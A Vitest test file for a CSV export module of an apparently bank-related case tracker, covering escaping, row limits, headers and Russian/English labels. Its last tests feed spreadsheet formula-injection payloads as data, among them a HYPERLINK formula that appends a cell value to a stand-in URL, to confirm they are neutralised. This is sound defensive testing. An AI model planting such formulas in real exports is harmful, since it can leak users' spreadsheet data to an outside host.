import { describe, expect, it } from "vitest";
import { CSV_LIMIT, csvEscape, neutralizeFormula, toCsv, type CsvOptions } from "../src/csv.js";
import { generateAll } from "../src/generator.js";
import { COLUMN_IDS, Database, Restriction } from "../src/schema.js";
import { isoDay } from "../src/days.js";
import { effectiveDue, isAnswered, workingDaysLeft, writeNote } from "../src/store.js";
import { clientName } from "../src/text.js";
import { labels as enLabels, pools as en } from "../src/pools/en.js";
import { labels as ruLabels, pools as ru } from "../src/pools/ru.js";

const store = generateAll(20261006, 1_200, 400);
const index = Uint32Array.from([0, 1, 2]);
const ruOptions: CsvOptions = { headers: ruLabels.columns, pools: ru, labels: ruLabels };

describe("csv export", () => {
  it("quotes only what needs quoting", () => {
    expect(csvEscape("ООО «Вектор»")).toBe("ООО «Вектор»");
    expect(csvEscape("а;б")).toBe('"а;б"');
    expect(csvEscape('с "кавычками"')).toBe('"с ""кавычками"""');
  });

  it("writes a header row and one line per row", () => {
    const lines = toCsv(store, index, ["id", "client", "stage"], ruOptions).split("\r\n");
    expect(lines).toHaveLength(4);
    expect(lines[0]).toBe("Номер;Заявитель;Этап");
    expect(lines[1]?.startsWith("C-000001;")).toBe(true);
    expect(lines[1]?.endsWith(ruLabels.stage[store.stage[0] ?? 0] ?? "")).toBe(true);
  });

  it("skips unknown columns and honours the row limit", () => {
    expect(toCsv(store, index, ["id", "nope"], ruOptions).split("\r\n")[0]).toBe("Номер");
    const all = Uint32Array.from({ length: 1_000 }, (_, i) => i);
    expect(toCsv(store, all, ["id"], { ...ruOptions, limit: 10 }).split("\r\n")).toHaveLength(11);
    expect(CSV_LIMIT).toBe(5_000);
  });

  it("caps at CSV_LIMIT rows by default", () => {
    const big = generateAll(1, 6_000, 2_000);
    const all = Uint32Array.from({ length: 6_000 }, (_, i) => i);
    expect(toCsv(big, all, ["id"], ruOptions).split("\r\n")).toHaveLength(CSV_LIMIT + 1);
  });

  it("takes the header from the caller and falls back to the id", () => {
    const csv = toCsv(store, index, ["id", "opAmount", "note"], { ...ruOptions, headers: { id: "№", opAmount: "Сумма; руб." } });
    expect(csv.split("\r\n")[0]).toBe('№;"Сумма; руб.";note');
  });

  it("writes every column of the catalogue with the defaults", () => {
    const row = Array.from({ length: store.size }, (_, i) => i).find((i) => store.linked[i]! >= 0 && store.operation[i]! > 0)!;
    const [header, line] = toCsv(store, [row], COLUMN_IDS, { headers: enLabels.columns, pools: en, labels: enLabels }).split("\r\n");
    expect(header?.split(";")).toHaveLength(27);
    const cells = Object.fromEntries(COLUMN_IDS.map((id, k) => [id, line!.split(";")[k]]));
    expect(cells.id).toBe(`C-${String(row + 1).padStart(6, "0")}`);
    expect(cells.received).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:00\.000Z$/);
    expect(cells.registered).toBe(isoDay(store.registered[row]!));
    expect(cells.due).toBe(isoDay(effectiveDue(store, row)));
    expect(cells.stage).toBe(enLabels.stage[store.stage[row]!]);
    expect(cells.linked).toMatch(/^C-\d{6}$/);
    expect(cells.operation).toMatch(/^OP-[0-9A-Z]{7}$/);
    expect(cells.opAmount).toBe(String(store.opAmount[row]));
  });

  it("writes the client's own data in the Bank of Russia's database, with or without the Ministry of Internal Affairs' information, and nothing for the other cases", () => {
    const of = (code: number) => Array.from({ length: store.size }, (_, i) => i).find((i) => store.database[i] === code)!;
    const rows = [of(Database.None), of(Database.ClientData), of(Database.ClientDataWithPoliceInformation)];
    const cells = (options: CsvOptions) => toCsv(store, rows, ["database"], options).split("\r\n").slice(1);
    expect(cells({ headers: enLabels.columns, pools: en, labels: enLabels })).toEqual(["", "The client's data", "The client's data and the police information"]);
    expect(cells(ruOptions)).toEqual(["", "Сведения о клиенте", "Сведения о клиенте и сведения МВД"]);
  });

  it("writes the bank's restriction for the client's own data: the suspension, or the transfer cap instead, and nothing for the other cases", () => {
    const of = (code: number) => Array.from({ length: store.size }, (_, i) => i).find((i) => store.restriction[i] === code)!;
    const rows = [of(Restriction.None), of(Restriction.InstrumentSuspended), of(Restriction.TransfersCapped)];
    const cells = (options: CsvOptions) => toCsv(store, rows, ["restriction"], options).split("\r\n").slice(1);
    expect(cells({ headers: enLabels.columns, pools: en, labels: enLabels })).toEqual(["", "Card and online banking suspended", "Transfers to individuals up to RUB 100,000 a month"]);
    expect(cells(ruOptions)).toEqual(["", "Приостановлены карта и онлайн-банк", "Переводы физлицам до 100 000 ₽ в месяц"]);
  });

  it("uses the caller's formatters, separator and newline", () => {
    const csv = toCsv(store, [0], ["opAmount", "registered"], {
      ...ruOptions,
      separator: ",",
      newline: "\n",
      formatNumber: (n) => n.toFixed(2),
      formatDay: () => "day",
    });
    expect(csv).toBe(`${ruLabels.columns.opAmount},${ruLabels.columns.registered}\n${store.opAmount[0]!.toFixed(2)},day`);
    expect(csvEscape("a,b", ",")).toBe('"a,b"');
    expect(csvEscape("a;b", ",")).toBe("a;b");
  });

  it("writes the same numbers and dates in every language and only the strings change", () => {
    const columns = ["id", "opAmount", "left", "due", "client", "stream"];
    const rows = Uint32Array.from({ length: 200 }, (_, i) => i);
    const split = (csv: string) => csv.split("\r\n").slice(1).map((l) => l.split(";"));
    const a = split(toCsv(store, rows, columns, { headers: enLabels.columns, pools: en, labels: enLabels }));
    const b = split(toCsv(store, rows, columns, ruOptions));
    a.forEach((cells, r) => {
      expect(cells.slice(0, 4)).toEqual(b[r]!.slice(0, 4));
      expect(cells[4]).toBe(clientName(store.applicant[r]!, store.client[r]!, en));
      expect(b[r]![4]).toBe(clientName(store.applicant[r]!, store.client[r]!, ru));
    });
  });

  it("writes edited and colleague notes in the chosen language", () => {
    const s = generateAll(2, 10, 10);
    writeNote(s, 0, { kind: "text", text: 'said "no"; call later' }, 0);
    writeNote(s, 1, { kind: "colleague", n: 4 }, 0);
    const csv = toCsv(s, [0, 1], ["note"], ruOptions).split("\r\n");
    expect(csv[1]).toBe('"said ""no""; call later"');
    expect(csv[2]).toBe("Правка коллеги 4");
  });

  it("writes text that starts like a formula as text, so a spreadsheet does not run it", () => {
    expect(neutralizeFormula("=1+1")).toBe("'=1+1");
    for (const lead of ["=", "+", "-", "@", "\t", "\r", "＝", "＋", "－", "＠"]) {
      expect(neutralizeFormula(`${lead}x`)).toBe(`'${lead}x`);
    }
    expect(neutralizeFormula("a=b")).toBe("a=b");
    expect(neutralizeFormula("")).toBe("");
    const s = generateAll(3, 6, 6);
    const payloads = ['=HYPERLINK("http://example.test/?"&A1,"Open")', "+1", "-2", "@SUM(A1:A9)", "\tcmd", "\rcmd"];
    payloads.forEach((text, row) => writeNote(s, row, { kind: "text", text }, 0));
    expect(toCsv(s, [0, 1, 2, 3, 4, 5], ["note"], ruOptions).split("\r\n").slice(1)).toEqual([
      '"\'=HYPERLINK(""http://example.test/?""&A1,""Open"")"',
      "'+1",
      "'-2",
      "'@SUM(A1:A9)",
      "'\tcmd",
      '"\'\rcmd"',
    ]);
  });

  it("neutralises a formula in a header, but never a number", () => {
    const s = generateAll(3, 2, 2);
    s.opAmount[0] = -1500;
    const csv = toCsv(s, [0], ["opAmount", "left"], { ...ruOptions, headers: { opAmount: "=cmd", left: "Left" } }).split("\r\n");
    expect(csv[0]).toBe("'=cmd;Left");
    expect(csv[1]).toBe(`-1500;${isAnswered(s, 0) ? "" : workingDaysLeft(s, 0)}`);
    const answered = Array.from({ length: store.size }, (_, i) => i).find((i) => isAnswered(store, i))!;
    expect(toCsv(store, [answered], ["left"], ruOptions).split("\r\n")[1]).toBe("");
  });
});
